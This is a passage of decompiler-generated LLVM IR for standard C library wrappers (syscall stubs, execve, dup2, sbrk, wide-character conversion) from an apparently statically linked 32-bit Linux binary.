  %v2_80545e8 = inttoptr i32 %v1_80545e3 to i32*
  store i32 %v0_80545e8, i32* %v2_80545e8, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v1_80545fc = add i32 %tmp2, 20
  %v2_80545fc = inttoptr i32 %v1_80545fc to i32*
  %v3_80545fc = load i32, i32* %v2_80545fc, align 4
  call void @__pseudo_branch(i32 %v3_80545fc)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ecx, align 4
  %v0_8054616 = call i32 @vfork()
  %v5_8054619 = icmp ult i32 %v0_8054616, -4095
  %v1_805461e = icmp eq i1 %v5_8054619, false
  call void @__pseudo_cond_branch(i1 %v1_805461e, i32 134563292)
  ret i32 %v0_8054616
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054628 = load i32, i32* @ebx, align 4
  store i32 %v0_8054628, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805463b = call i32 @int80_syscall(i32 102)
  store i32 %v1_805463b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805463b, -4095
  br i1 %tmp, label %dec_label_pc_8054654, label %dec_label_pc_8054648

dec_label_pc_8054648:                             ; preds = %entry
  %v0_8054648 = load i32, i32* %stack_var_-4, align 4
  %v1_8054648 = call i32 @__errno_location(i32 %v0_8054648)
  %v0_805464d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805464d = sub i32 0, %v0_805464d
  %v2_805464f = inttoptr i32 %v1_8054648 to i32*
  store i32 %v1_805464d, i32* %v2_805464f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054654

dec_label_pc_8054654:                             ; preds = %entry, %dec_label_pc_8054648
  %v0_8054655 = phi i32 [ %v1_805463b, %entry ], [ -1, %dec_label_pc_8054648 ]
  %v2_8054654 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054654, i32* @edx, align 4
  %v2_8054658 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054658, i32* @ebx, align 4
  ret i32 %v0_8054655

; uselistorder directives
  uselistorder i32 %v1_805463b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054654, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805465c = load i32, i32* @ebx, align 4
  store i32 %v0_805465c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805466f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805466f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805466f, -4095
  br i1 %tmp, label %dec_label_pc_8054688, label %dec_label_pc_805467c

dec_label_pc_805467c:                             ; preds = %entry
  %v0_805467c = load i32, i32* %stack_var_-4, align 4
  %v1_805467c = call i32 @__errno_location(i32 %v0_805467c)
  %v0_8054681 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054681 = sub i32 0, %v0_8054681
  %v2_8054683 = inttoptr i32 %v1_805467c to i32*
  store i32 %v1_8054681, i32* %v2_8054683, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054688

dec_label_pc_8054688:                             ; preds = %entry, %dec_label_pc_805467c
  %v0_8054689 = phi i32 [ %v4_805466f, %entry ], [ -1, %dec_label_pc_805467c ]
  %v2_805468c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805468c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054689

; uselistorder directives
  uselistorder i32 %v4_805466f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054688, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8054690 = load i32, i32* @ebx, align 4
  store i32 %v0_8054690, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80546a3 = call i32 @dup2(i32 %v0_8054690, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80546a3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80546a3, -4095
  br i1 %tmp, label %dec_label_pc_80546bc, label %dec_label_pc_80546b0

dec_label_pc_80546b0:                             ; preds = %entry
  %v0_80546b0 = load i32, i32* %stack_var_-4, align 4
  %v1_80546b0 = call i32 @__errno_location(i32 %v0_80546b0)
  %v0_80546b5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546b5 = sub i32 0, %v0_80546b5
  %v2_80546b7 = inttoptr i32 %v1_80546b0 to i32*
  store i32 %v1_80546b5, i32* %v2_80546b7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80546bc

dec_label_pc_80546bc:                             ; preds = %entry, %dec_label_pc_80546b0
  %v0_80546bd = phi i32 [ %v4_80546a3, %entry ], [ -1, %dec_label_pc_80546b0 ]
  %v2_80546c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80546c0, i32* @ebx, align 4
  ret i32 %v0_80546bd

; uselistorder directives
  uselistorder i32 %v4_80546a3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80546bc, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546c4 = load i32, i32* @edi, align 4
  store i32 %v0_80546c4, i32* %stack_var_-4, align 4
  %v4_80546c8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80546c8, i32* %edi.global-to-local, align 4
  %v0_80546d4 = load i32, i32* @ebx, align 4
  %v5_80546dc = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80546dc = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80546dc = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80546dc, [1 x i8*] %v8_80546dc)
  store i32 %v9_80546dc, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80546dc, -4095
  br i1 %tmp12, label %dec_label_pc_80546f4, label %dec_label_pc_80546e8

dec_label_pc_80546e8:                             ; preds = %entry
  %v1_80546e8 = call i32 @__errno_location(i32 %v0_80546d4)
  %v0_80546ed = load i32, i32* %edi.global-to-local, align 4
  %v1_80546ed = sub i32 0, %v0_80546ed
  %v2_80546ef = inttoptr i32 %v1_80546e8 to i32*
  store i32 %v1_80546ed, i32* %v2_80546ef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80546f4

dec_label_pc_80546f4:                             ; preds = %entry, %dec_label_pc_80546e8
  %v0_80546f5 = phi i32 [ %v9_80546dc, %entry ], [ -1, %dec_label_pc_80546e8 ]
  %v2_80546f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80546f4, i32* @edx, align 4
  %v2_80546f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80546f8, i32* %edi.global-to-local, align 4
  ret i32 %v0_80546f5

; uselistorder directives
  uselistorder i32 %v9_80546dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546f4, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80546ff = ptrtoint i32* %stack_var_-8 to i32
  %v2_8054706 = call i32 @getrlimit(i32 7, i32 %v2_80546ff)
  store i32 256, i32* @edx, align 4
  %v2_8054713 = icmp slt i32 %v2_8054706, 0
  br i1 %v2_8054713, label %dec_label_pc_805471b, label %dec_label_pc_8054717

dec_label_pc_8054717:                             ; preds = %entry
  %v3_8054717 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8054717, i32* @edx, align 4
  br label %dec_label_pc_805471b

dec_label_pc_805471b:                             ; preds = %entry, %dec_label_pc_8054717
  %v0_805471b = phi i32 [ 256, %entry ], [ %v3_8054717, %dec_label_pc_8054717 ]
  ret i32 %v0_805471b

; uselistorder directives
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %dec_label_pc_805471b, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054724 = load i32, i32* @ebx, align 4
  store i32 %v0_8054724, i32* %stack_var_-4, align 4
  %v1_805472d = call i32 @int80_syscall(i32 202)
  store i32 %v1_805472d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805472d, -4095
  br i1 %tmp, label %dec_label_pc_8054744, label %dec_label_pc_8054738

dec_label_pc_8054738:                             ; preds = %entry
  %v0_8054738 = load i32, i32* %stack_var_-4, align 4
  %v1_8054738 = call i32 @__errno_location(i32 %v0_8054738)
  %v0_805473d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805473d = sub i32 0, %v0_805473d
  %v2_805473f = inttoptr i32 %v1_8054738 to i32*
  store i32 %v1_805473d, i32* %v2_805473f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054744

dec_label_pc_8054744:                             ; preds = %entry, %dec_label_pc_8054738
  %v0_8054745 = phi i32 [ %v1_805472d, %entry ], [ -1, %dec_label_pc_8054738 ]
  %v2_8054748 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054748, i32* @ebx, align 4
  ret i32 %v0_8054745

; uselistorder directives
  uselistorder i32 %v1_805472d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054744, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805474c = load i32, i32* @ebx, align 4
  store i32 %v0_805474c, i32* %stack_var_-4, align 4
  %v1_8054755 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8054755, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8054755, -4095
  br i1 %tmp, label %dec_label_pc_805476c, label %dec_label_pc_8054760

dec_label_pc_8054760:                             ; preds = %entry
  %v0_8054760 = load i32, i32* %stack_var_-4, align 4
  %v1_8054760 = call i32 @__errno_location(i32 %v0_8054760)
  %v0_8054765 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054765 = sub i32 0, %v0_8054765
  %v2_8054767 = inttoptr i32 %v1_8054760 to i32*
  store i32 %v1_8054765, i32* %v2_8054767, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805476c

dec_label_pc_805476c:                             ; preds = %entry, %dec_label_pc_8054760
  %v0_805476d = phi i32 [ %v1_8054755, %entry ], [ -1, %dec_label_pc_8054760 ]
  %v2_8054770 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054770, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805476d

; uselistorder directives
  uselistorder i32 %v1_8054755, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805476c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054774 = load i32, i32* @ebx, align 4
  store i32 %v0_8054774, i32* %stack_var_-4, align 4
  %v1_805477d = call i32 @int80_syscall(i32 199)
  store i32 %v1_805477d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805477d, -4095
  br i1 %tmp, label %dec_label_pc_8054794, label %dec_label_pc_8054788

dec_label_pc_8054788:                             ; preds = %entry
  %v0_8054788 = load i32, i32* %stack_var_-4, align 4
  %v1_8054788 = call i32 @__errno_location(i32 %v0_8054788)
  %v0_805478d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805478d = sub i32 0, %v0_805478d
  %v2_805478f = inttoptr i32 %v1_8054788 to i32*
  store i32 %v1_805478d, i32* %v2_805478f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054794

dec_label_pc_8054794:                             ; preds = %entry, %dec_label_pc_8054788
  %v0_8054795 = phi i32 [ %v1_805477d, %entry ], [ -1, %dec_label_pc_8054788 ]
  %v2_8054798 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054798, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054795

; uselistorder directives
  uselistorder i32 %v1_805477d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054794, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805479d = load i32, i32* @ebx, align 4
  %v0_80547a1 = load i32, i32* @global_var_80677a8.285, align 8
  %v1_80547a1 = icmp eq i32 %v0_80547a1, 0
  %v1_80547ac = icmp eq i1 %v1_80547a1, false
  br i1 %v1_80547ac, label %dec_label_pc_80547bf, label %dec_label_pc_80547ae

dec_label_pc_80547ae:                             ; preds = %entry
  %v1_80547b3 = call i32 @__GI_brk(i32 0)
  %v2_80547bb = icmp slt i32 %v1_80547b3, 0
  br i1 %v2_80547bb, label %dec_label_pc_80547e1, label %dec_label_pc_80547ae.dec_label_pc_80547bf_crit_edge

dec_label_pc_80547ae.dec_label_pc_80547bf_crit_edge: ; preds = %dec_label_pc_80547ae
  %v0_80547c1.pre = load i32, i32* @global_var_80677a8.285, align 8
  br label %dec_label_pc_80547bf

dec_label_pc_80547bf:                             ; preds = %dec_label_pc_80547ae.dec_label_pc_80547bf_crit_edge, %entry
  %v0_80547cf = phi i32 [ %v0_80547c1.pre, %dec_label_pc_80547ae.dec_label_pc_80547bf_crit_edge ], [ %v0_80547a1, %entry ]
  %v1_80547bf = icmp eq i32 %arg1, 0
  %v1_80547c6 = icmp eq i1 %v1_80547bf, false
  br i1 %v1_80547c6, label %dec_label_pc_80547cc, label %dec_label_pc_80547c8

dec_label_pc_80547c8:                             ; preds = %dec_label_pc_80547bf
  br label %dec_label_pc_80547e4

dec_label_pc_80547cc:                             ; preds = %dec_label_pc_80547bf
  store i32 %v0_80547cf, i32* @ebx, align 4
  %v2_80547d1 = add i32 %v0_80547cf, %arg1
  %v1_80547d5 = call i32 @__GI_brk(i32 %v2_80547d1)
  %v2_80547dd = icmp slt i32 %v1_80547d5, 0
  %v1_80547df = icmp eq i1 %v2_80547dd, false
  br i1 %v1_80547df, label %dec_label_pc_80547cc.dec_label_pc_80547e4_crit_edge, label %dec_label_pc_80547e1

dec_label_pc_80547cc.dec_label_pc_80547e4_crit_edge: ; preds = %dec_label_pc_80547cc
  %v0_80547e5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80547e4

dec_label_pc_80547e1:                             ; preds = %dec_label_pc_80547cc, %dec_label_pc_80547ae
  br label %dec_label_pc_80547e4

dec_label_pc_80547e4:                             ; preds = %dec_label_pc_80547cc.dec_label_pc_80547e4_crit_edge, %dec_label_pc_80547c8, %dec_label_pc_80547e1
  %v0_80547e5 = phi i32 [ %v0_80547e5.pre, %dec_label_pc_80547cc.dec_label_pc_80547e4_crit_edge ], [ %v0_80547cf, %dec_label_pc_80547c8 ], [ -1, %dec_label_pc_80547e1 ]
  store i32 %v0_805479d, i32* @ebx, align 4
  ret i32 %v0_80547e5

; uselistorder directives
  uselistorder i32 %v0_80547cf, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80547e4, { 2, 0, 1 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80653fc.179 to i32)

; uselistorder directives
  uselistorder i32* @global_var_80653fc.179, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_80547ff = icmp eq i32 %tmp4, 0
  %v1_8054801 = icmp eq i1 %v1_80547ff, false
  br i1 %v1_8054801, label %dec_label_pc_8054809, label %dec_label_pc_8054803

dec_label_pc_8054803:                             ; preds = %entry
  %v2_8054803 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8054809

dec_label_pc_8054809:                             ; preds = %entry, %dec_label_pc_8054803
  %v0_8054825 = phi i32 [ %tmp4, %entry ], [ %v2_8054803, %dec_label_pc_8054803 ]
  %v0_8054811 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_8054803 ]
  %v2_8054809 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8054809, i32* %stack_var_-8, align 4
  store i32 %v0_8054811, i32* %stack_var_-4, align 4
  %v2_8054820 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8054826 = inttoptr i32 %v0_8054825 to i8*
  %v6_8054826 = call i32 @__GI_wcsnrtombs(i8* %v5_8054826, i32 %v2_8054820, i32 1, i32 16, i32 %tmp)
  %v1_8054830 = icmp eq i32 %v6_8054826, 0
  %v3_8054832 = select i1 %v1_8054830, i32 1, i32 %v6_8054826
  ret i32 %v3_8054832

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8054809, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8054851 = inttoptr i32 %tmp to i8*
  %v6_8054851 = call i32 @__GI_wcsnrtombs(i8* %v5_8054851, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8054851
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_805485f = load i32, i32* @ebx, align 4
  %v4_8054863 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054863, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8054873 = icmp eq i8* %arg1, null
  store i1 %v1_8054873, i1* %zf.global-to-local, align 1
  br i1 %v1_8054873, label %dec_label_pc_8054882, label %dec_label_pc_8054877

dec_label_pc_8054877:                             ; preds = %entry
  %v12_8054877 = icmp eq i32 %v4_8054863, %arg2
  store i1 %v12_8054877, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805487e = icmp eq i1 %v12_8054877, false
  br i1 %v1_805487e, label %dec_label_pc_80548a5, label %dec_label_pc_805489f

dec_label_pc_8054882:                             ; preds = %entry
  %v2_8054882 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054882, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80548a3

dec_label_pc_805488b:                             ; preds = %dec_label_pc_80548b3
  %v1_805488b = call i32 @__errno_location(i32 %v0_805485f)
  %v1_8054890 = inttoptr i32 %v1_805488b to i32*
  store i32 84, i32* %v1_8054890, align 4
  br label %dec_label_pc_80548d9

dec_label_pc_805489b:                             ; preds = %dec_label_pc_80548ba
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80548ce.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80548ca

dec_label_pc_805489f:                             ; preds = %dec_label_pc_8054877
  %v2_805489f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805489f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80548a3

dec_label_pc_80548a3:                             ; preds = %dec_label_pc_8054882, %dec_label_pc_805489f
  %v2_80548bc16 = phi i32 [ %v2_8054882, %dec_label_pc_8054882 ], [ %v2_805489f, %dec_label_pc_805489f ]
  %v1_80548a812 = phi i32 [ -1, %dec_label_pc_8054882 ], [ %arg4, %dec_label_pc_805489f ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80548a5

dec_label_pc_80548a5:                             ; preds = %dec_label_pc_8054877, %dec_label_pc_80548a3
  %v2_80548bc15 = phi i32 [ %v4_8054863, %dec_label_pc_8054877 ], [ %v2_80548bc16, %dec_label_pc_80548a3 ]
  %v0_80548aa = phi i32 [ %arg4, %dec_label_pc_8054877 ], [ %v1_80548a812, %dec_label_pc_80548a3 ]
  %v1_80548a5 = inttoptr i32 %arg2 to i32*
  %v2_80548a5 = load i32, i32* %v1_80548a5, align 4
  store i32 %v2_80548a5, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_80548aa, %arg3
  %v5_80548ac = select i1 %tmp31, i32 %arg3, i32 %v0_80548aa
  store i32 %v5_80548ac, i32* %edi.global-to-local, align 4
  store i32 %v5_80548ac, i32* @ecx, align 4
  %v1_80548c63 = icmp eq i32 %v5_80548ac, 0
  store i1 %v1_80548c63, i1* %zf.global-to-local, align 1
  %v1_80548c810 = icmp eq i1 %v1_80548c63, false
  br i1 %v1_80548c810, label %dec_label_pc_80548b3, label %dec_label_pc_80548ca

dec_label_pc_80548b3:                             ; preds = %dec_label_pc_80548a5, %dec_label_pc_80548c0
  %v2_80548bc = phi i32 [ %v2_80548c3, %dec_label_pc_80548c0 ], [ %v2_80548bc15, %dec_label_pc_80548a5 ]
  %v0_80548b3 = phi i32 [ %v1_80548c0, %dec_label_pc_80548c0 ], [ %v2_80548a5, %dec_label_pc_80548a5 ]
  %v1_80548b3 = inttoptr i32 %v0_80548b3 to i32*
  %v2_80548b3 = load i32, i32* %v1_80548b3, align 4
  %v9_80548b5 = icmp eq i32 %v2_80548b3, 127
  store i1 %v9_80548b5, i1* %zf.global-to-local, align 1
  %v6_80548b8 = icmp ugt i32 %v2_80548b3, 127
  br i1 %v6_80548b8, label %dec_label_pc_805488b, label %dec_label_pc_80548ba

dec_label_pc_80548ba:                             ; preds = %dec_label_pc_80548b3
  %v3_80548ba = trunc i32 %v2_80548b3 to i8
  %v4_80548ba = icmp eq i8 %v3_80548ba, 0
  store i1 %v4_80548ba, i1* %zf.global-to-local, align 1
  %v3_80548bc = inttoptr i32 %v2_80548bc to i8*
  store i8 %v3_80548ba, i8* %v3_80548bc, align 1
  %v0_80548be = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80548be, label %dec_label_pc_805489b, label %dec_label_pc_80548c0

dec_label_pc_80548c0:                             ; preds = %dec_label_pc_80548ba
  %v0_80548c0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80548c0 = add i32 %v0_80548c0, 4
  store i32 %v1_80548c0, i32* %ebx.global-to-local, align 4
  %v0_80548c3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80548c3 = load i32, i32* %esi.global-to-local, align 4
  %v2_80548c3 = add i32 %v1_80548c3, %v0_80548c3
  store i32 %v2_80548c3, i32* %edx.global-to-local, align 4
  %v0_80548c5 = load i32, i32* @ecx, align 4
  %v1_80548c5 = add i32 %v0_80548c5, -1
  %v8_80548c5 = icmp eq i32 %v1_80548c5, 0
  store i32 %v1_80548c5, i32* @ecx, align 4
  store i1 %v8_80548c5, i1* %zf.global-to-local, align 1
  %v1_80548c8 = icmp eq i1 %v8_80548c5, false
  br i1 %v1_80548c8, label %dec_label_pc_80548b3, label %dec_label_pc_80548ca

dec_label_pc_80548ca:                             ; preds = %dec_label_pc_80548c0, %dec_label_pc_80548a5, %dec_label_pc_805489b
  %v0_80548d2 = phi i32 [ 0, %dec_label_pc_805489b ], [ %v2_80548a5, %dec_label_pc_80548a5 ], [ %v1_80548c0, %dec_label_pc_80548c0 ]
  %v0_80548ce = phi i32 [ %v0_80548ce.pre, %dec_label_pc_805489b ], [ %v2_80548bc15, %dec_label_pc_80548a5 ], [ %v2_80548c3, %dec_label_pc_80548c0 ]
  %v2_80548ca = ptrtoint i32* %stack_var_-32 to i32
  %v12_80548ce = icmp eq i32 %v0_80548ce, %v2_80548ca
  store i1 %v12_80548ce, i1* %zf.global-to-local, align 1
  br i1 %v12_80548ce, label %dec_label_pc_80548d5, label %dec_label_pc_80548d2

dec_label_pc_80548d2:                             ; preds = %dec_label_pc_80548ca
  %v1_80548d2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80548d2 = inttoptr i32 %v1_80548d2 to i32*
  store i32 %v0_80548d2, i32* %v2_80548d2, align 4
  br label %dec_label_pc_80548d5

dec_label_pc_80548d5:                             ; preds = %dec_label_pc_80548ca, %dec_label_pc_80548d2
  %v0_80548d5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80548d7 = load i32, i32* @ecx, align 4
  %v2_80548d7 = sub i32 %v0_80548d5, %v1_80548d7
  %v12_80548d7 = icmp eq i32 %v2_80548d7, 0
  br label %dec_label_pc_80548d9

dec_label_pc_80548d9:                             ; preds = %dec_label_pc_805488b, %dec_label_pc_80548d5
  %storemerge = phi i1 [ %v12_80548d7, %dec_label_pc_80548d5 ], [ false, %dec_label_pc_805488b ]
  %storemerge1 = phi i32 [ %v2_80548d7, %dec_label_pc_80548d5 ], [ -1, %dec_label_pc_805488b ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_80548d9 = load i32, i32* @esp, align 4
  %v9_80548d9 = icmp eq i32 %v0_80548d9, -28
  store i1 %v9_80548d9, i1* %zf.global-to-local, align 1
  store i32 %v0_805485f, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_80548ce, { 1, 0 }
  uselistorder i32 %v2_80548c3, { 0, 2, 1 }
  uselistorder i32 %v1_80548c0, { 0, 2, 1 }
  uselistorder i32 %v2_80548b3, { 1, 2, 0 }
  uselistorder i32 %v2_80548a5, { 1, 0, 2 }
  uselistorder i32 %v0_80548aa, { 1, 0 }
  uselistorder i32 %v2_80548bc15, { 1, 0 }
  uselistorder i1 %v12_8054877, { 1, 0 }
  uselistorder i32 %v4_8054863, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 2, 1, 3, 8, 5, 6, 7, 0, 9, 4, 10, 11, 12 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 7, 3, 4, 8, 5, 6 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80548d9, { 1, 0 }
  uselistorder label %dec_label_pc_80548d5, { 1, 0 }
  uselistorder label %dec_label_pc_80548b3, { 1, 0 }
  uselistorder label %dec_label_pc_80548a5, { 1, 0 }
  uselistorder label %dec_label_pc_80548a3, { 1, 0 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80548e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80548e4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80548ef = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 %tmp11)
  store i32 %v3_80548ef, i32* @eax, align 4
  %v10_80548f9 = icmp eq i32 %v3_80548ef, -1
  br i1 %v10_80548f9, label %dec_label_pc_8054910, label %dec_label_pc_80548fe

dec_label_pc_80548fe:                             ; preds = %entry
  %v0_80548fe = load i32, i32* @ebx, align 4
  %v4_8054906 = inttoptr i32 %arg2 to i8*
  %v5_8054906 = call i32 @_stdio_fopen(i32 %v3_80548ef, i8* %v4_8054906, i32 0, i32 %v0_80548fe)
  br label %dec_label_pc_8054910

dec_label_pc_8054910:                             ; preds = %entry, %dec_label_pc_80548fe
  %v0_8054910 = phi i32 [ 0, %entry ], [ %v5_8054906, %dec_label_pc_80548fe ]
  %v2_8054914 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054914, i32* @ebx, align 4
  ret i32 %v0_8054910

; uselistorder directives
  uselistorder i32 %v3_80548ef, { 1, 0, 2 }
